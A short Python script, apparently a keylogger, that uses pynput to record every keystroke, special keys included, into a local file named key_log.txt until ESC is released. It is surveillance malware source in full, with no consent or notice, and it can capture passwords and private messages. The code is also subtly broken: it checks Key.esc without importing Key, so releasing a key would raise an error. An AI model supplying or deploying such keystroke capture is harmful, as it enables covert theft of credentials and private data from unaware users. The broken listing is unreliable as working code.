from pynput.keyboard import Listener

# Specify the log file
log_file = "key_log.txt"

def on_press(key):
    # Write the key to the log file
    with open(log_file, "a") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            # Handle special keys
            f.write(f"{key}")

def on_release(key):
    # Stop listener if ESC is pressed
    if key == Key.esc:
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
